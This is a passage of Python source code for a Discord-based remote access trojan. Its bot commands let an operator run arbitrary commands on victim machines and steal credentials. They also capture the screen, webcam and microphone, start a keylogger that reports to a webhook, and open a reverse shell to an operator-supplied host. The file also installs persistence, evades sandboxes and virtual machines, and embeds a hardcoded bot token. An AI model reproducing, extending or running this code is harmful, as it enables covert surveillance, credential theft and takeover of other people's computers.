            color = 0x00ff00 if success else 0xff0000
            embed = discord.Embed(title="👤 Sign Out", description=message, color=color)
            await ctx.reply(embed=embed)
        except Exception as e:
            embed = discord.Embed(title="❌ Error", description=str(e), color=0xff0000)
            await ctx.reply(embed=embed)
    else:
        await ctx.reply("❌ No agent selected! Use `/interact <id>` first.")

@bot.hybrid_command(name="cancel_shutdown", with_app_command=True, description="Cancel pending shutdown")
@app_commands.guilds(GUILD)
async def cancel_shutdown_cmd(ctx: commands.Context):
    """Cancel pending shutdown"""
    if (int(CURRENT_AGENT) == int(ID)):
        try:
            from libraries import cancel_shutdown
            success, message = cancel_shutdown()
            color = 0x00ff00 if success else 0xff0000
            embed = discord.Embed(title="🚫 Cancel Shutdown", description=message, color=color)
            await ctx.reply(embed=embed)
        except Exception as e:
            embed = discord.Embed(title="❌ Error", description=str(e), color=0xff0000)
            await ctx.reply(embed=embed)
    else:
        await ctx.reply("❌ No agent selected! Use `/interact <id>` first.")

@bot.hybrid_command(name="control_panel", with_app_command=True, description="Open control panel for current agent")
@app_commands.guilds(GUILD)
async def control_panel(ctx: commands.Context):
    """Open control panel"""
    if not CURRENT_AGENT:
        embed = discord.Embed(title="❌ No Agent Selected", description="Use `/interact <id>` first", color=0xff0000)
        await ctx.reply(embed=embed, ephemeral=True)
        return
    
    embed = discord.Embed(title="🎮 Control Panel", description=f"**Controlling Agent:** `#{CURRENT_AGENT}`\nSelect a category:", color=0x00ff00)
    await ctx.reply(embed=embed, view=MainControlPanel(CURRENT_AGENT), ephemeral=True)

# === YOUR EXISTING BOT HYBRID COMMANDS (keep them all) ===
@bot.hybrid_command(name = "interact", with_app_command = True, description = "Interact with an agent")
@app_commands.guilds(GUILD)
async def cmd(ctx: commands.Context, id:int):
    global CURRENT_AGENT 
    CURRENT_AGENT = id
    my_embed = discord.Embed(title=f"Interacting with Agent#{id}", color=0x00FF00)
    await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "background", with_app_command = True, description = "Background an agent")
@app_commands.guilds(GUILD)
async def background_cmd(ctx: commands.Context):
    global CURRENT_AGENT 
    CURRENT_AGENT = 0
    my_embed = discord.Embed(title=f"Background Agent", color=0x00FF00)
    await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "cmd", with_app_command = True, description = "Run any command on the target machine")
@app_commands.guilds(GUILD)
async def cmd_cmd(ctx: commands.Context, command:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.cmd(command)
        if len(result) > 2000:
            path = os.environ["temp"] +"\\response.txt"     
            with open(path, 'w') as file:
                file.write(result)
            await ctx.reply(file=discord.File(path))
            os.remove(path)
        else:
            await ctx.reply("```"+result+"```")

@bot.hybrid_command(name = "cmd-all", with_app_command = True, description = "Run any command on the all online agents")
@app_commands.guilds(GUILD)
async def cmd_all(ctx: commands.Context, command:str):
    result = disctopia.cmd(command)
    if len(result) > 2000:
        path = os.environ["temp"] +"\\response.txt"     
        with open(path, 'w') as file:
            file.write(result)
        await ctx.reply(file=discord.File(path))
        os.remove(path)
    else:
        await ctx.reply("```"+result+"```")

@bot.hybrid_command(name = "webshot", with_app_command = True, description = "Capture a picture from the target machine's screen")
@app_commands.guilds(GUILD)
async def webshot(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        if ctx.interaction:
            my_embed = discord.Embed(title=f"Please use **!webshot {ID}** instead of the slash command", color=0xFF0000)
            await ctx.reply(embed=my_embed) 
        else:
            result = disctopia.webshot()
            if result != False:
                await ctx.reply(file=discord.File(result))
                os.remove(result)
            else:
                my_embed = discord.Embed(title=f"Error while taking photo to Agent#{ID}", color=0xFF0000)
                await ctx.reply(embed=my_embed)
        
@bot.hybrid_command(name = "cd", with_app_command = True, description = "Change the current directory on the target machine")
@app_commands.guilds(GUILD)
async def cd(ctx: commands.Context, path:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.cd(path)
        if (result):
            my_embed = discord.Embed(title=f"Succesfully changed directory to: {path}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while changing directory:\n{result}", color=0xFF0000)    
        await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "process", with_app_command = True, description = "List all the processes running on the target machine")
@app_commands.guilds(GUILD)
async def process(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.process()
        if len(result) > 4000:
            path = os.environ["temp"] +"\\response.txt"         
            with open(path, 'w') as file:
                file.write(result)
            await ctx.reply(file=discord.File(path))
            os.remove(path)
        else:
            await ctx.reply(f"```\n{result}\n```")

@bot.hybrid_command(name = "upload", with_app_command = True, description = "Upload a file to the agent")
@app_commands.guilds(GUILD)
async def upload(ctx: commands.Context, url:str, name:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.upload(url, name)
        if result:
            my_embed = discord.Embed(title=f"{name} has been uploaded to Agent#{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while uploading {name} to Agent#{ID}:\n{result}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "screenshot", with_app_command = True, description = "Take a screenshot of the target machine's screen")
@app_commands.guilds(GUILD)
async def screenshot(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.screenshot()
        if result != False:
            await ctx.reply(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error while taking screenshot to Agent#{ID}", color=0xFF0000)
            await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "creds", with_app_command = True, description = "Get the credentials of the target machine")
@app_commands.guilds(GUILD)
async def creds(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.creds()
        if result != False:
            await ctx.reply(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error while grabbing credentials from Agent#{ID}", color=0xFF0000)
            await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "persistent", with_app_command = True, description = "Make the agent persistent on the target machine")
@app_commands.guilds(GUILD)
async def persistent(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.persistent()
        if result:
            my_embed = discord.Embed(title=f"Persistance enabled on Agent#{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while enabling persistance on Agent#{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "ls", with_app_command = True, description = "List all the current online agents")
@app_commands.guilds(GUILD)
async def ls(ctx: commands.Context):
    if ctx.interaction:
         my_embed = discord.Embed(title=f"Please use **!ls** instead of the slash command", color=0xFF0000)
         await ctx.reply(embed=my_embed)
    else:
        my_embed = discord.Embed(title=f"Agent #{ID}   IP: {disctopia.getIP()}", color=0xADD8E6)
        my_embed.add_field(name="**OS**", value=disctopia.getOS(), inline=True)
        my_embed.add_field(name="**Username**", value=disctopia.getUsername(), inline=True)
        view = InteractButton("Interact", ID)
        await ctx.reply(embed=my_embed, view=view)

@bot.hybrid_command(name = "download", with_app_command = True, description = "Download file from the target machine")
@app_commands.guilds(GUILD)
async def download(ctx: commands.Context, path:str):
    if (int(CURRENT_AGENT) == int(ID)):
        try:
            await ctx.reply(f"**Agent #{ID}** Requested File:", file=discord.File(path))
        except Exception as e:
            my_embed = discord.Embed(title=f"Error while downloading from Agent#{ID}:\n{e}", color=0xFF0000)
            await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "terminate", with_app_command = True, description = "Terminate the agent")
@app_commands.guilds(GUILD)
async def terminate(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        my_embed = discord.Embed(title=f"Terminating Connection With Agent#{ID}", color=0x00FF00)
        await ctx.reply(embed=my_embed)
        await bot.close()        
        sys.exit()

@bot.hybrid_command(name = "selfdestruct", with_app_command = True, description = "Delete the agent from the target machine")
@app_commands.guilds(GUILD)
async def selfdestruct(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.selfdestruct()
        if result:
            my_embed = discord.Embed(title=f"Agent#{ID} has been deleted", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while deleting Agent#{ID}: {result}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "location", with_app_command = True, description = "Get the location of the target machine")
@app_commands.guilds(GUILD)
async def location(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        response = disctopia.location()
        if response != False:
            my_embed = discord.Embed(title=f"IP Based Location on Agent#{ID}", color=0x00FF00)
            my_embed.add_field(name="IP:", value=f"**{response.json()['YourFuckingIPAddress']}**", inline=False)
            my_embed.add_field(name="Hostname:", value=f"**{response.json()['YourFuckingHostname']}**", inline=False)
            my_embed.add_field(name="City:", value=f"**{response.json()['YourFuckingLocation']}**", inline=False)
            my_embed.add_field(name="Country:", value=f"**{response.json()['YourFuckingCountryCode']}**", inline=False)
            my_embed.add_field(name="ISP:", value=f"**{response.json()['YourFuckingISP']}**", inline=False)
        else:
            my_embed = discord.Embed(title=f"Error while getting location of Agent#{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "revshell", with_app_command = True, description = "Get a reverse shell on the target machine")
@app_commands.guilds(GUILD)
async def revshell(ctx: commands.Context, ip:str, port:int):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.revshell(ip, port)
        if result:
            my_embed = discord.Embed(title=f"Attempting to Establish Reverse Shell on Agent#{ID}", color=0x00FF00)
        await ctx.reply(embed=my_embed)
    
@bot.hybrid_command(name = "recordmic", with_app_command = True, description = "Record the microphone of the target machine")
@app_commands.guilds(GUILD)
async def recordmic(ctx: commands.Context, seconds:int):
    if (int(CURRENT_AGENT) == int(ID)):
        if ctx.interaction:
            my_embed = discord.Embed(title=f"Please use **!recordmic {ID}** instead of the slash command", color=0xFF0000)
            await ctx.reply(embed=my_embed)
        else:
            result = disctopia.recordmic(seconds)
            if result != False:
                await ctx.reply(file=discord.File(result))
                os.remove(result)
            else:
                my_embed = discord.Embed(title=f"Error while starting recording on Agent#{ID}", color=0xFF0000)
                await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "wallpaper", with_app_command = True, description = "Change the wallpaper of the target machine")
@app_commands.guilds(GUILD)
async def wallpaper(ctx: commands.Context, path_url:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.wallpaper(path_url)
        if result:
            my_embed = discord.Embed(title=f"Wallpaper changed on Agent#{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while changing wallpaper on Agent#{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "killproc", with_app_command = True, description = "Kill a process on the target machine")
@app_commands.guilds(GUILD)
async def killproc(ctx: commands.Context, pid:int):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.killproc(pid)
        if result:
            my_embed = discord.Embed(title=f"Process {pid} killed on Agent#{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while killing process {pid} on Agent#{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "keylog", with_app_command = True, description = "Start a keylogger on the target machine")
@app_commands.guilds(GUILD)
async def keylog(ctx: commands.Context, mode:str ,interval:int):
    if (int(CURRENT_AGENT) == int(ID)):
        logger = keylogger.Keylogger(interval=interval, ID=ID, webhook=KEYLOGGER_WEBHOOK, report_method="webhook")
        if mode == "stop":
            logger.stop()
            await ctx.reply(embed=discord.Embed(title=f"Keylogger stopped on Agent#{ID}", color=0x00FF00))
        else:
            threading.Thread(target=logger.start).start()
            await ctx.reply(embed=discord.Embed(title=f"Keylogger started on Agent#{ID}", color=0x00FF00))

@bot.hybrid_command(name = "help", with_app_command = True, description = "Help menu")
@app_commands.guilds(GUILD)
async def help_cmd(ctx: commands.Context):
    my_embed = discord.Embed(title=f"Help Menu", color=0x00FF00)
    my_embed.add_field(name="/help", value="Shows this menu", inline=False)
    my_embed.add_field(name="/interact <id>", value="Interact with a specific agent", inline=False)
    my_embed.add_field(name="/control_panel", value="Open interactive control panel", inline=False)
    my_embed.add_field(name="/lock, /unlock", value="Lock/unlock PC inputs", inline=False)
    my_embed.add_field(name="/shutdown, /restart", value="Shutdown or restart PC", inline=False)
    my_embed.add_field(name="/signout", value="Sign out current user", inline=False)
    my_embed.add_field(name="/cancel_shutdown", value="Cancel pending shutdown", inline=False)
    # ... include all your other commands ...
    await ctx.reply(embed=my_embed)

if sandboxevasion.test() == True and disctopia.isVM() == False:
    config = disctopia.createConfig()
    ID = disctopia.id()
    if config:
        MSG = f"New Agent Online #{ID}"
        COLOR = 0x00ff00
    else:
        MSG =f"Agent Online #{ID}"
        COLOR = 0x0000FF

    bot.run("MTQyMDU0OTkxMDU3NDUzMDYyMQ.G7dizq.DQSD4SCBsWtSdV_MUdy7PSAhF2VksOGgja37aU")